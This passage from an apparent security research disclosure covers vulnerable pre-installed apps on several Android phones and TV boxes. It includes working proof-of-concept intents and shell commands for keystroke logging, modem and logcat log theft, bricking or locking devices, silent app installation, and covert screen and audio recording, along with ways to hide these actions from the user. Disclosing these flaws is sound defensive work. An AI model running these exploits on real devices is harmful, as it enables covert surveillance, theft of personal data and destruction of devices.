The Vivo V7 device contains the com.qualcomm.qti.modemtestmode (versionCode=25, versionName=7.1.2) app. This device has a build fingerprint of vivo/1718/1718:7.1.2/N2G47H/compil11021857:user/release-keys. A third-party app can modify certain system properties on the device. Specifically, setting the persist.sys.input.log key to a value of 1, will make the user's screen touches be written to the logcat log by the InputDispatcher for all apps. Vivo V7 also contains a vulnerability to have a pre-installed app write the logcat logs to the SD card as detailed in Section 5.5. With some effort and knowledge of the device, an attacker can translate the coordinates to keyboard keypresses. This allows the attacker to determine the user's keypresses on the keyboard, potentially exposing PII. The device will need to be rebooted in order for the system property to be read at boot time. A third-party app can quickly cause a system crash and reboot the Vivo V7 device by sending a broadcast intent with an action of intent.action.super_power_save_send. The system crash is due to inadequate null-checking at runtime and also a lack of exception handling in the system_sever process. Below are some log messages from the Vivo V7 device showing the x and y touch coordinates.

9.2 Coolpad Canvas  Write Logcat log, Kernel log, and tcpdump Capture to the SD Card
The Coolpad Canvas Android device35 is sold by Cricket Wireless and contains a vulnerable version of the com.qualcomm.qti.modemtestmode (versionCode=24, versionName=7.0) app, allowing third-party apps to change certain system properties (as explained in Section 9) . The build fingerprint of the device is Coolpad/cp3636a/cp3636a:7.0/NRD90M/093031423:user/release-keys. Setting a system property can enable logging features on the device that would not otherwise be unavailable to a third-party app. Specifically, using the method described above, any app can set the persist.service.logr.enable property to a value of 1 to enable logging on the device. When this occurs, the device will start writing log files to a path of /sdcard/log. Below is a listing of the files created in the /sdcard/log directory.

cp3636a:/sdcard/log $ ls -al

Five of the files correspond to the different log buffers (crash, events, radio, system, and main). These files are highlighted in orange. Android prevents third-party apps from reading directly from the system-wide logcat log since it tends to contain sensitive data. The kernel log is highlighted in purple. A network package capture (pcap) file is also highlighted in green. The qsee file, highlighted in blue contains a log for when logging starts. Therefore, any app with the READ_EXTERNAL_STORAGE permission can enable the logging to the SD card and read the log files.

When the persist.service.logr.enable system property is set to a value of 1 when the device finishes booting, an app with a package name of com.yulong.logredirect (versionCode=20160622, versionName=5.25_20160622_01) will create a sticky notification. If the setting of the persist.service.logr.enable system property to a value of 1 happens after the boot process has completed, then notification will not be created by the com.yulong.logredirect app. Therefore, to keep the notification from appearing, the attacking app will have to set the persist.service.logr.enable system property to a value of 0 prior to the device being shut down or rebooted. To accomplish this the app needs to dynamically-register a broadcast receiver that listens for the action of android.intent.action.ACTION_SHUTDOWN. Once this broadcast is received, the app will use an already

existing object that extends the ServiceConnection interface to quickly interact with the MbnTestService

bound service to quickly change the persist.service.logr.enable system property to a value of 0. Then

when the device boots back up again, the notification will not be on and the attacking app can listen for

various broadcast intents through a statically declared broadcast receiver app component in the attacking

app's AndroidManifest.xml file. This unburdens the attack app of also having to request the

RECEIVE_BOOT_COMPLETED permission. For example, the app can statically register for the following

broadcast

actions:

android.intent.action.SIM_STATE_CHANGED

and

org.codeaurora.intent.action.ACTION_NETWORK_SPECIFIER_SET. Interacting with the

com.qualcomm.qti.modemtestmode app to change system properties is done in the same way as in

Appendix G for the Vivo V7 device, except the Coolpad Canvas device uses an interface token name of

com.qualcomm.qti.modemtestmode.IMbnTestService

instead

of

com.qualcomm.qti.modemtestmode.f that is used for the Vivo V7. Other than this, the code to interact

with the bound services is the same where the attacking app provides the appropriate key-value pair to

modify system properties.

9.3 Coolpad Canvas  Leaking Telephony Data to the Logcat Log Vulnerability

The previous vulnerability (i.e., activating the logcat logs) allows any third-party app with the READ_EXTERNAL_STORAGE permission to read various log files including the logcat log. The standard Android Open Source Project (AOSP) code for the com.android.phone app does not write Short Message Service (SMS) messages to the Android log.

The com.android.phone app writes the user's sent text messages to the logcat log.

10. ZTE Devices  Dump Modem Logs and Logcat Logs to the SD Card
We discovered a vulnerability that allows any third-party app on the device to activate the writing of the modem and logcat logs to the SD card. This vulnerability has been present on each ZTE device we have examined with all of them were sold by US carriers. Specifically, the devices and their build fingerprints are provided below.

Verizon ZTE Blade Vantage - ZTE/Z839/sweet:7.1.1/NMF26V/20180120.095344:user/release-keys AT&T ZTE Blade Spark - ZTE/Z971/peony:7.1.1/NMF26V/20171129.143111:user/release-keys T-Mobile ZTE Zmax Pro - ZTE/P895T20/urd:6.0.1/MMB29M/20170418.114928:user/release-keys Total Wireless ZTE Zmax Champ - ZTE/Z917VL/fortune:6.0.1/MMB29M/20170327.120922:user/release-keys

This vulnerability allows any app co-located on the device to use another app's capabilities to obtain sensitive data that the initiating app itself lacks permission to access. An app using this vulnerability to monitor the user's telephony behavior will require the READ_EXTERNAL_STORAGE permission. This permission allows an app to read from the device's external storage (SD card). If the monitoring of the modem logs is to continue for an extended period of time, the attacking app should also periodically delete the logs since the aggregate size of the modem log files can start to fill up external storage. When this occurs, the user may notice a notification that indicates that the log files are taking up too much space external storage. To avoid this notification, the attacking app needs to delete old modem log files to ensure that adequate space remains so as to not potentially alert the user via a notification. The com.android.modem.service.ISdlogService interface (explained later) conveniently provides the deleteAllLog() method, so the attacking app does not need to request the WRITE_EXTERNAL_STORAGE permission. In any case, the app facilitating the modem logging functionality , com.android.modem.service (versionCode=25, versionName=7.1.1), cannot be disabled by the user. If the modem logs themselves or a file containing only parsed data from them is to be exfiltrated from the device, the attacking app should also request the INTERNET permission. The modem logs will be written to a base directory of /sdcard/sd_logs. A concrete file path of a modem log is /sdcard/sd_logs/sdlog_09_11_24_58.qmdl.gz. This file is a Qualcomm Extensible Monitor Log file that has been compressed using gzip. The modem log contains the raw SMS Protocol Data Units (PDUs) for sent and received text messages, including the message body, timestamp, and telephone number. In addition, the modem log contains the phone numbers for placed and received phone calls. The subsections below will be described used the ZTE Blade Vantage, although the process is the same for all ZTE devices we have examined.
10.1 ZTE  Obtaining the Modem Log Vulnerability Details
The Android OS contains a service manager that allows apps to obtain a reference to the available services on the device. The service manager resides within the system_server process. The system_server process is a critical OS process that provides necessary services to apps on the device. Apps that execute as the system user (the same user that system_server uses) have the ability to register services with the OS service manager and make them available to other apps on the device. The ZTE Blade Vantage contains a pre-installed platform app with a package name of com.android.modem.service (versionCode=25, versionName=7.1.1) that executes as the system user and registers a service named ModemService. The com.android.modem.service.ModemService class within the com.android.modem.service package explicitly registers itself with an interface class of com.android.modem.service.IModemService$Stub to the Android OS service manager. The com.android.modem.service.IModemService$Stub is provided to the Android OS service manager so that other apps can obtain a reference to this interface and use the service. Method calls on this interface will be delivered to the com.android.modem.service.ModemService class within the com.android.modem.service package. The com.android.modem.service.ModemService class itself acts as a mini service manager for services it offers within its own app (com.android.modem.service). Specifically, the IModemService interface contains 5 methods that can be called where each returns a service interface. Their method signatures are provided below, showing the method name and the service interface they return.
getAdbLogInterface() returns com.android.modem.service.ILogService getAssistantInterface() returns com.android.modem.service.IAssistantService getModemInterface() returns com.android.modem.service.IModem

getModemRegistryInterface() returns com.android.modem.service.IModemRegistry getSdlogInterface() returns com.android.modem.service.ISdlogService

The attacking app first obtains a reference to the service named ModemService using Java reflection from

the Android OS service manager. This retrieved service has an interface named

com.android.modem.service.IModemService. Using the IModemService reference, the attacking app

can call the getSdlogInterface() method exported by the IModemService interface. The

getSdlogInterface()

method

returns

another

interface

named

com.android.modem.service.ISdlogService.

Method

calls

made

to

com.android.modem.service.ISdlogService interface will be delivered to the

com.android.modem.service.SdlogService

class.

The

com.android.modem.service.ISdlogService interface contains a large number of methods for

controlling the operation of the modem logging capability. In regard to making the device write the modem

logs to the SD card, the following methods on the com.android.modem.service.ISdlogService

interface are called in the following order: configSdlog(), enableLog(), and startLog(). At this point,

the device will start writing the modem logs to a base directory with a path of /sdcard/sd_logs. Any app

on the device that has permission to access the SD card, can process and parse the compressed qmdl files

for the user's telephony data. This binary file can be viewed in Qualcomm eXtensible Diagnostic Monitor

Professional (QXDM Pro) or the binary qmdl file can be parsed directly for the user's text messages and

call data. Below are byte sequences in PDU format for a sent text message and a received text message, as

well as a placed and received call. The PoC source code to enable the modem logs is provided in Appendix

H. The PoC code needs to be coded into an Android app and executed on the ZTE device with an active

Subscriber Identity Module (SIM) card. The examples below show the hexdump output of a binary qmdl

file from ZTE where the text message PDUs and call data have been identified.

10.2 ZTE  Obtaining the Logcat Log Vulnerability Details

The logcat logs consist of four different log buffers: system, main, radio, and events. The logcat log is a shared resource where any process on the device can write a message to the log. The logcat log is generally for debugging purposes. An app can read only from the logcat logs that the app itself has written unless it has requested and been granted the READ_LOGS permission by the Android OS. The Android OS and apps can write sensitive data to the logs, so the capability to read from the system-wide logcat log was taken away from third-party apps in Android 4.1. The logcat logs tend to contain email addresses, telephone numbers, GPS coordinates, unique device identifiers, and arbitrary messages written by any process on the device. A non-exhaustive list of concrete logcat log messages is provided in Appendix B. Using this vulnerability, a third-party app can leverage another app to write the system-wide logcat logs to the SD card. App developers may write sensitive data to the logcat log while under the impression that their messages will be private and unobtainable. Information disclosure from the logcat log can be damaging depending on the nature of the data written to the log. Appendix B contains a username and password pair being written to the log in a US Fortune 500 bank's Android app.

This vulnerability is present in the same app (com.android.modem.service) that allows the modem log

to be written to the SD card. A third-party app can use the ModemService to activate the logcat logs being

written to the SD card. As mentioned previously, the ModemService provides access to five different

services through interfaces to these services. The com.android.modem.service.IAssistantService

service interface allows any app on the device to programmatically enable the writing of the logcat logs to

the SD card. The writing of the logcat logs are inactive by default, although simply enabling their logging

to the SD card can be performed by an app with zero permissions. As mentioned with the modem logs, an

app that wants to read from the log files on the SD card, will need to request the READ_EXTERNAL_STORAGE

permission. The IAssistantService service interface is obtained by calling the

getAssistantInterface() method on the IModemService interface. Method calls to the

IAssistantService

service

interface

will

be

delivered

to

the

com.android.modem.service.AssistantService class. The methods exported by the

IAssistantService service interface mostly cover logging functions. To enable the logcat logs being

written to the SD card, the following two methods need to be called on the IAssistantService service

interface: enableDeamonProcess(boolean) and enableAdbLog(Boolean), where both Boolean values as

parameters to the methods have a value of true. Proof of Concept code is provided in Appendix I.

Once the logcat logs have been activated, they will get written, by default, to the /sdcard/sd_logs/AdbLog/logcat directory. Within this directory, there are four files matching the names of the different log buffers: logcat_events.txt, logcat_main.txt, logcat_radio.txt, and logcat_system.txt. These log files are in plaintext and can be parsed for known-formats of log messages that contain sensitive data. Since these logs are written by default to a directory within the /sdcard/sd_logs directory. The same method as previously, leveraging the deleteAllLog() method from the ISdlogService method, provides a way of deleting the log files periodically
11. Making Devices Inoperable
We found two interesting cases where the sending of a single intent message can render an Android device inoperable in the general case. The two devices are the MXQ Android 4.4.2 TV Box and the ZTE Zmax Champ sold by Total Wireless.
11.1 MXQ TV Box  Making Devices Inoperable
The MXQ TV Box has added in a broadcast receiver application component in the core Android package (i.e., android). This is part of the Android framework that runs in the system_server process. The MXQ TV Box device has a build fingerprint of MBX/m201_N/m201_N:4.4.2/KOT49H/20160106:user/testkeys. Any app on the device can send an intent to an exported broadcast receiver application component that will make the device inoperable. After the device wouldn't boot properly, we performed a factory reset of the device in recovery mode, and the device would still not boot properly. This leads us to believe that the system partition was modified as a result of the actions taken by the broadcast receiver that received an intent. Specifically, the package name of the app is android (versionCode=19, versionName=4.4.220170213), and it contains an exported broadcast receiver named com.android.server.SystemRestoreReceiver. Below is the declaration of the SystemRestoreReceiver app component in the app's AndroidManifest.xml file.
<receiver android:name="com.android.server.SystemRestoreReceiver" android:priority="100">
<intent-filter> <action android:name="android.intent.action.SYSTEM_RESTORE"/>
</intent-filter> </receiver>
Internally, the SystemRestoreReceiver app component, after receiving a broadcast intent addressed to it, calls the androidos.RecoverySystem.rebootRestoreSystem(android.content.Context) method. This is a custom method that was added into the android.os.RecoverySystem AOSP class. This custom method writes a value of --restore_system\n--locale=<locale> to the /cache/recovery/command file and boots into recovery mode. It appears that when booting into recovery mode, possibly the system partition gets formatted or modified, which would explain the device not booting. We did not examine the recovery partition to examine what actually occurs, but we did verify that the device is not functional after the SystemRestoreReceiver component executes. Below is the source code to send the broadcast intent that will make the device not boot properly. We believe that the user can recover the device by flashing clean firmware images to the SD card and flashing them in recovery mode. We have not tried this method,
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | sales@kryptowire.com

but generally Android TV boxes allow the owner of the device to flash firmware images that are present on the SD card.

Intent intent = new Intent(); intent.setClassName("android", "com.android.server.SystemRestoreReceiver"); sendBroadcast(intent);

11.2 ZTE Zmax Champ  Making Devices Inoperable

We purchased a Total Wireless ZTE Zmax Champ device from Best Buy. This device contains an preinstalled app with a package name of com.android.zte.hiddenmenu. This ZTE device has a build fingerprint of ZTE/Z917VL/fortune:6.0.1/MMB29M/20170327.120922:user/release-keys. Any app co-located on the ZTE Zmax Champ device can make the device generally unusable by sending a single broadcast intent with a specific action string. Once this is received, the phone will continually enter recovery mode and continually crash. We are not exactly sure why this occurs, but we have destroyed two phones using it. The phone will boot into recovery mode, try to perform a factory reset, fail, reboot, and then continually repeat all of the previous steps in a never-ending cycle. The device comes with a pre-installed app with a package name of com.android.zte.hiddenmenu (versionCode=23, versionName=6.0.1). This app executes as the system user and is a privileged platform app. In the app's AndroidManifest.xml file, a broadcast receiver named com.android.zte.hiddenmenu.CommandReceiver is declared that statically registers to receive broadcast intents with an action of android.intent.action.FD_RESET. Sending a broadcast intent with this action will cause the device to enter recovery mode and crash. The code to send the broadcast intent is provided below.

sendBroadcast(new Intent("android.intent.action.FD_RESET"));

The CommandReceiver broadcast receiver component is exported and accessible to any app co-located on

the device. Once the component receives a broadcast intent with an action of

android.intent.action.FD_RESET, the component internally sends a broadcast intent with an action of

android.intent.action.MASTER_CLEAR_DATA_CARRIER.

The

com.android.server.MasterClearReceiver class (running in the system_server process) dynamically

registers a broadcast receiver to receive broadcast intents with an action of

android.intent.action.MASTER_CLEAR_DATA_CARRIER. Once this action string is received by the

broadcast

receiver

it

will

call

the

android.os.RecoverySystem.rebootWipeUserDataAndCarrier(android.content.Context,

boolean, java.lang.String) method. This method will write a string value of the contents, shown

below, to a file with a file path of /cache/recovery/command and then boot into recovery mode.

--shutdown_after --wipe_carrier --reason=<reason> --locale=<locale>

10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | sales@kryptowire.com

The phone boots into recovery mode and then starts to perform a factory reset and quickly fails and repeats the process. We are unable to tell exactly why the fault is occurring since we do not have access to the recovery logs. It could be that the command written to the /cache/recovery/command file is malformed and causes a crash when in recovery mode and the command in the file keeps being read in and processed, causing another fault, where this cycle continues forever. When the device is continually crashing, we were
unable to boot into an alternate mode (e.g., system or bootloader). The --wipe_carrier command is not in AOSP code, and this command would have to be handled in recovery mode. The standard commands that are accepted in the /cache/recovery/command file are provided here in Google's AOSP source code 36 . Our hypothesis is that --wipe_carrier command or a different command causes the fault in recovery mode and this process repeats and always hits the same fault.

12. Taking Screenshots using system_server

Certain Android devices will take a screenshot and

write it to the SD card when a broadcast intent with a

specific action string is sent. On the vulnerable

devices, the system_server process dynamically

registers a broadcast receiver with a specific action

string (the specific action string depends on the

device, as it is not constant across devices). The

contents of the screen buffer are regarded as sensitive.

All of the devices we examined that allow a third-

party app to indirectly take a screenshot perform

some animation when a screenshot is taken and leave

a notification in the status bar, so it is not transparent

to the user. A notification is created indicating that a

screenshot was taken. If all caution is thrown to the

wind, a malicious app may open interesting apps, take

screenshots, and exfiltrate them. Although the

screenshot capability cannot be disabled by the user

due to it residing in the system_server process, this

approach is aggressive. Figure 3 shows a screenshot

containing notifications, including a password reset

to take screenshots while the user has been inactive for a period of time. This can be accomplished by

running a service in the background and dynamically registering for the SCREEN_ON and SCREEN_OFF

broadcast intents to know when the device is actively in use by the user. The attacking app can create an activity that will come to the foreground and turn on the screen even when a screen lock is present. This can be accomplished by setting the WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED and WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD flags on the current window in the activity when it is started. If the app requests the EXPAND_STATUS_BAR permission, the app can expand the status bar to show the current notifications by getting the system service named statusbar as an IBinder and then calling the android.app.StatusBarManager.expandNotificationsPanel() method (for API level 17 and above) on it via Java reflection and using the open interface to take a screenshot. If the device has an active screen lock, only notifications received after the screen lock has been activated will show up when a screenshot is taken. The attacking app can then use a generic approach to cause a system crash to remove the notification that a picture was taken. All Android devices that run Android 5.0 to Android 6.0.1 have a vulnerable app component where a single intent message can cause a system crash due to inadequate exception handling in the system_server process. We developed a generic method to cause a system crash on all Android API levels by causing the system_server process to exhaust all of its heap memory. An open-source PoC app we developed is available here37. Table 7 provides the devices that we found that allow any app co-located on the device to utilize an open interface in the system_server process to take a screenshot and write it to external storage. Any app with the READ_EXTERNAL_STORAGE permission can access the screenshots.

13. LG Android Devices  Lock the User out of Their Device

We found a rather unique and interesting attack present on certain LG devices that allows a zero-permission app to lock the user out of their device by applying a screen lock that is completely unresponsive to the user except for making emergency phone calls. We verified that the devices show below are vulnerable.

LG G6 - lge/lucye_nao_us_nr/lucye:7.0/NRD90U/17355125006e7:user/release-keys LG Q6 - lge/mhn_lao_com_nr/mhn:7.1.1/NMF26X/173421645aa48:user/release-keys

An exposed dynamically-registered broadcast receiver within the com.android.systemui app (versionCode=600170209, versionName=6.00.170209) allows any app on the device to essentially lock the user out of their phone in most cases. This technique could be used to create a crypto-less ransomware to force the user to pay to unlock their device. Below are the SHA-256 hashes for the com.lge.gnsslogcat app's APK file and ODEX file from the LG G6 device.

97e5e02340417c997476861c0c4d316d0ced24dd6906f9aa2afd9f3ad15ccc0f LGSystemUI.apk 9dfc1b1e4591f0dc739dd583c14f8a6251626eaae302430da0e032e61772edbf LGSystemUI.odex

The com.android.systemui.keyguard.KeyguardViewMediator class dynamically registers a broadcast

receiver with an action of com.lge.CMCC_DM_PARTIALLY_LOCK, as well as for other actions. When a

broadcast intent is sent by any app on the device, it will be received by an anonymous class within the

KeyguardViewMediator

class.

This

will

in

turn

call

the

KeyguardViewMediator.doKeyguardUnlockDisabled(Boolean, java.lang.String) method. This

method will set both the com.lge.CMCC_DM_LOCK and UnlockCallerNum keys in the system table to a

value of 1 and then call the KeyguardViewMediator.doKeyguardTimeout(android.os.Bundle) method

to lock the screen. At this point, the screen will be locked and cannot be unlocked through traditional

methods. If ADB is not enabled on the device, the user will be forced to boot into recovery mode and

perform a factory reset to recover the device. If ADB has already been enabled, they can use the unlock

method described subsequently. Below is the source code to send the broadcast intent.

sendBroadcast(new Intent("com.lge.CMCC_DM_PARTIALLY_LOCK"));

The screen lock put in place by the com.android.systemui app that receives the broadcast intent will not be responsive to touches except for the emergency call button. This screen lock will persist across system reboots and even appear in safe mode. We were unable to find a way to remove this lock screen except when ADB was enabled prior to a third-party app co-located on the device forcing the lock screen to lock. If ADB was not enabled on the device prior to the screen lock, then the user will likely have to boot into recovery mode by pressing a specific key combination at boot time and perform a factory reset, which will remove the screen lock but also wipe all the user's data and app. If ADB was enabled prior to the appearance of this special screen lock, then the user could hook their device up to a computer that had already been approved provided it's RSA key fingerprint to the LG device. At this point, the user can enter the following command via ADB to unlock the device.

adb shell am broadcast -a com.lge.CMCC_DM_UNLOCK

Alternatively, the following set of commands can undo the changes manually in the system table.

adb shell settings put system com.lge.CMCC_DM_LOCK 0 adb shell settings put system UnlockCallerNum 0

A large majority of Android users would not have ADB enabled, as this functionality is for developers and Android enthusiasts. In addition, they would need to find out the actions to take to unlock it, which would likely be difficult for the average user to discover on their own.

14. Asus ZenFone 3 Max  Arbitrary App Installation
The arbitrary app installation vulnerability was discovered in an Asus ZenFone 3 Max device with a build fingerprint of asus/US_Phone/ASUS_X008_1:7.0/NRD90M/US_Phone-14.14.1711.9220171208:user/release-keys. This device contains a pre-installed app with a package name of com.asus.dm (versionCode=1510500200, versionName=1.5.0.40_171122) has an exposed interface that allows any app co-located on the device to use its capabilities to download an arbitrary app over the internet and install it. Furthermore, any app that was programmatically installed using this method can also be programmatically uninstalled using the com.asus.dm app. The com.asus.dm app has an exported service named com.asus.dm.installer.DMInstallerService. Any app on the device can send an intent with specific embedded data that will cause the com.asus.dm app to programmatically download and install the app. For the app to be downloaded and installed, certain data needs to be provided in the intent: download URL, package name, version name from the app's AndroidManifest.xml file, and the MD5 hash of the app. Below is the source code to download and install the Xposed Installer APK file.
Intent i4 = new Intent(); i4.setAction("com.asus.dm.installer.download_app"); i4.setClassName("com.asus.dm", "com.asus.dm.installer.DMInstallerService"); i4.putExtra("EXTRA_DL_URL", "https://dlxda.xposed.info/modules/de.robv.android.xposed.installer_v33_36570c.apk"); i4.putExtra("EXTRA_INSTALL_PACKAGE", "de.robv.android.xposed.installer"); i4.putExtra("EXTRA_DL_CHECKSUM", "36570c6fac687ffe08107e6a72bd3da7"); i4.putExtra("EXTRA_INSTALL_VERSION", "2.7"); startService(i4);
At this point, the Xposed Installer app can be started by the app that initiated its installation. If the app that initiated the installation of the Xposed Installer app decides that it should be uninstalled, it can use the source code below to uninstall it. This method only works for apps that were installed using the approach above and not for apps that were installed via other methods such as the user installing an app via the app distribution channel of Google Play.
Intent i7 = new Intent(); i7.setAction("com.asus.dm.installer.removeService"); i7.setClassName("com.asus.dm", "com.asus.dm.installer.DMInstallerService"); i7.putExtra("EXTRA_APP_NAME", "de.robv.android.xposed.installer"); startService(i7);
15. Video Recording the User's Screen
Sometimes pre-installed apps can expose the capability to record the user's screen through a privileged pre-installed app. We provide two instances of screen recording: Vivo V7 and Doogee X5.
15.1 Vivo V7  Video Recording the User's Screen
The Vivo V7 device we examined had a build fingerprint of vivo/1718/1718:7.1.2/N2G47H/compil04201658:user/release-keys. The device contains a preinstalled app with a package name of com.vivo.smartshot (versionCode=1, versionName=3.0.0). This app will record the screen for 60 minutes and write an mp4 file to a location of the attacking app's choosing.
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | sales@kryptowire.com

Normally, a recording notification will be visible to the user, but we will detail an approach to make it mostly transparent to the user. The com.vivo.smartshot app has an exported service named com.vivo.smartshot.ui.service.ScreenRecordService. The approach is to start the ScreenRecordService which will start a separate binary named /system/bin/smartshot that performs the recording of the screen. Once the ScreenRecordService is started, it will create a sticky notification saying "Recording screen" and create a stop button on the side of the screen. These can be removed by then stopping the ScreenRecordService shortly after starting it. After the ScreenRecordService is stopped, the /system/bin/smartshot binary continues recording. The recording will continue for 60 minutes and there is the possibility that the com.vivo.smartshot app will be killed if there is memory pressure as it does not have any active app components. To provide an active component, the attacking app will then start the ScreenRecordService with some values embedded in the intent that will not start a new recording or interfere with the active recording. If the recording is stopped early, the file may be corrupted, so the entire 60 minutes should be observed and then the mp4 file will be able to be played without any modification. Moreover, the attacking app can have the /system/bin/smartshot binary write the mp4 file to its private directory, so the attacking app does not need the READ_EXTERNAL_STORAGE permission to read from external storage. This is achieved by first changing the file permissions to the attacking app's private directory, so it can be accessed by the /system/bin/smartshot binary, as SELinux does not block it on the device. Once the file permissions are changed to be world-executable on the app's directory, it will then create an empty file using a specific file name that will later be passed to the ScreenRecordService as a file name for the mp4 file. Then the newly created file (e.g., screen.mp4) in the attacking app's private directory is made world-writable. To make the user completely oblivious to the recording of the screen, the source code below can be executed when the device's screen is off (requires registering a broadcast receiver listening for the SCREEN_OFF broadcast intent), so there is not disturbance to the GUI with the anticipation that the user will use their device in the next 60 minutes. Then the attacking app executes the code below as was explained above.
Intent i = new Intent(); i.setAction("vivo.action.ACTION_START_RECORD_SERVICE"); i.setClassName("com.vivo.smartshot", "com.vivo.smartshot.ui.service.ScreenRecordService"); i.putExtra("vivo.flag.vedio_file_path", "/data/data/com.some.app/screen.mp4"); i.putExtra("show_top_stop_view", false); startService(i); try {
Thread.sleep(500); } catch (InterruptedException e) {
e.printStackTrace(); } i = new Intent(); i.setClassName("com.vivo.smartshot", "com.vivo.smartshot.ui.service.ScreenRecordService"); stopService(i); try {
Thread.sleep(500); } catch (InterruptedException e) {
e.printStackTrace(); } i = new Intent("vivo.acton.ACTION_CHANGE_TOP_STOP_VIEW"); i.setClassName("com.vivo.smartshot", "com.vivo.smartshot.ui.service.ScreenRecordService"); i.putExtra("show_top_stop_view", false); startService(i);

At the end of 60 minutes after executing the code above, the /system/bin/smartshot binary finishes its recording and the attacking app can view the previous 60 minutes of the screen usage and observe the user's behavior. This may involve the user entering passwords, entering credit card numbers, writing personal messages and emails, etc. This resulting mp4 file can be sent to a remote location if the attacking app has the INTERNET permission.
15.2 Doogee X5  Video Recording the User's Screen
This device allows third party apps to programmatically initiate the recording of the screen by sending an intent to a pre-installed app. The build fingerprint of the Doogee X5 device is DOOGEE/full_hct6580_weg_c_m/hct6580_weg_c_m:6.0/MRA58K/1503503147:user/test-keys. This app has a package name of com.hct.screenrecord (versionCode=1, versionName=1.0). When the screen recording occurs, it is not transparent to the user. A visible effect on the screen is a blinking red circle. There is also a notification indicating that the screen is being recorded, although the notification is does not allow the user to stop the recording if clicked. The screen recording will stop when the screen goes off or when the user clicks the red circle. The mp4 file will be written to external storage to a base path of /sdcard/ScreenRecord. A third-party app can initiate the screen recording with the following source code.
Intent i = new Intent(); i.setClassName("com.hct.screenrecord", "com.hct.screenrecord.ScreenRecordService"); startService(i);
16. Oppo F5  Audio Record the User
This vulnerability allows any app co-located on the device to record audio of the user and their surroundings. To exploit this vulnerability, the command execution as the system user (see Section 4.5), must also be used to transfer the file due to its restrictive file permissions. The Oppo F5 device we examined had a build fingerprint of OPPO/CPH1723/CPH1723:7.1.1/N6F26Q/1513597833:user/release-keys. The Oppo F5 Android device comes a pre-installed app with a package name of com.oppo.engineermode app (versionCode=25, versionName=V1.01). The com.oppo.engineermode.autoaging.MicTest activity application component within the com.oppo.engineermode app will start recording audio and write it to a file in the /data directory when it is started (e.g., /data/2018-05-03_04.42.37.amr). When this activity is started by an external app, the external app can wait 600 milliseconds and then send an intent to return to the home screen. This will start the audio recording and the app will not be visible in the recent apps due to starting the activity with the Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS flag. So, the user may see an activity pop up and close quickly, although they will not be able to view the activity from the recent apps and would likely be unaware that the audio recording is occurring. The source code is provided below.
Intent i = new Intent("com.oppo.engineermode.autoaging.MicTest"); i.setClassName("com.oppo.engineermode", "com.oppo.engineermode.autoaging.MicTest"); i.setFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS); this.startActivity(i); try {
Thread.sleep(600); } catch (InterruptedException e) {
e.printStackTrace(); } Intent i2 = new Intent("android.intent.action.MAIN");

i2.addCategory(Intent.CATEGORY_HOME); startActivity(i2);
The MicTest activity component will keep recording as long as the activity is alive. The user will not be able to view the activity through the recent apps list to close it. While the audio recording is ongoing, there is no indication to the user such as a notification, toast message, etc. As the audio file is recoding, it can be copied to another location, and the copied file will still be playable. The attacking app does not require any permissions to obtain the audio recording file (an amr file), although the app will need the INTERNET permission if the audio file is to be sent to a remote server. Once the attacking app wants the recording file, it needs to determine the file name of the audio file. This can be accomplished by using the com.dropboxchmod app to list the files in the /data directory. Using the approach in Section 4.1.2, the attacking app can transfer one or all amr files to the attacking apps private directory by leveraging the com.dropboxchmod app that allows arbitrary command execution as the system user. SELinux on the Oppo F5 device does not prevent the system user from writing to a third-party app's private directory. The same behavior is not present on the Asus ZenFone V Live device, although it is present on the Asus ZenFone 3 device. The SELinux rules dictate the capability of a platform app directly writing to a third-party app' private directory. Prior to making the com.dropboxchmod app write any files to its internal directory, it will need to make its private app directory (e.g., /data/data/some.attacking.app) both writable and executable. Below are the commands the attacking app can have the com.dropboxchmod app to transfer the audio recording file to is private app directory using the approach detailed in Section 4.5.
cp /data/2018-05-03_04.42.37.amr /data/data/the.attacking.app chmod 777 /data/data/the.attacking.app/2018-05-03_04.42.37.amr
At this point the 2018-05-03_04.42.37.amr file is readable by the attacking app and can be sent to a remote location.
Conclusion
Pre-installed apps present a potent attack vector due to their access to privileged permissions, potential widespread presence, and the fact that the user may not be able to disable or remove them. Vulnerable pre-installed apps can present a tangible threat to end-users since certain apps can contain exposed interfaces that will leak PII to locations accessible by other apps on the device. Furthermore, certain vulnerabilities facilitate surveillance by allowing the recording of audio, video, and the user's keystrokes. As we have shown in this document, even devices sold by US carriers can contain severe vulnerabilities. We argue that more effort should be invested in scanning for vulnerabilities and threats that are present on a device as soon as the user first removes it from the box and powers it on.

Appendix H. PoC Code for Obtaining the Modem Logs.
Below is the source code to initiate the writing of the modem logs to the SD card. After executing this code, a directory with a path of /sdcard/sd_logs will appear. After around 20 seconds, a binary file will appear in this directory. An example file name is sdlog_13_12_44_21.qmdl.gz. The file needs to be decompressed with gunzip first. Then the file can be parsed for telephony data matching specific formats or input into a program that views or converts the qmdl file. The code below needs to be inserted into an Android app on a ZTE device. In addition, the device should have a SIM card inserted.

Appendix I. PoC Code for Obtaining the Logcat Logs.
Below is the source code to initiate the writing of the logcat logs to the SD card. After executing this code, a directory with a path of /sdcard/sd_logs/AdbLog/logcat will be created. Then four files corresponding to the names of the logcat log buffers will start being written in the directory.
